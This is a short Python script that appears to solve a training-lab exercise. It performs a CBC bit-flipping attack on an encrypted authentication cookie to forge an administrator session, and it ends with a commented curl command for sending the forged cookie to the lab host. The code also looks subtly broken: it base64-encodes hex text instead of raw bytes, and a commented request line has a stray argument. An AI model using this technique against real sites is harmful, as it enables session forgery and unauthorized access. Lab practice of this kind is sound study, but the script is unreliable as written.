import requests
import urllib
import base64
'''
url = 'http://ptl-5760bb97-d0494256.libcurl.so/index.php'
response = requests.post(url,data={"cdmin": "c"}, cookit)
print(response.content)'''
def decode(cookie):
    decode_url = urllib.parse.unquote(cookie)
    decode_base64 = base64.urlsafe_b64decode(decode_url) 
    decode_hex = decode_base64.hex()
    return decode_hex

def encode(cookie):
    cookie = bytes(cookie, 'utf8')
    decode_base64 = base64.urlsafe_b64encode(cookie)
    decode_url = urllib.parse.quote(decode_base64)
    return decode_url



cookie = "YmRtaW5pc3RyYXRvci0tNMnDOUwGvDk%3D"#input("Enter your cookie - ")
iv = "yEM702zl5sI%3D"#input("Enter your IV - ")
decode_cookie = decode(cookie)
decode_IV = decode(iv)
print("decoded cookie - ",decode_cookie)
print("decoded IV - ",decode_IV)

admin_byte = ord('a')^int(decode_cookie[0:2], 16)^int(decode_IV[0:2], 16)
print("This is byte in hex- ",hex(admin_byte))
new_IV = str(hex(admin_byte))[2:] + decode_IV[2:]
new_IV = encode(new_IV)
print("new IV - ", new_IV)
new_cookie = str(hex(ord('a')))[2:] + decode_cookie[2:]#get 'a' in hex str
new_cookie = encode(new_cookie)
print("new cookie - ", new_cookie)

#print("curl -H 'Cookie: iv=%s; auth=%s' http://ptl-20c0f9c6-78f74687.libcurl.so/index.php" % (new_IV, new_cookie))
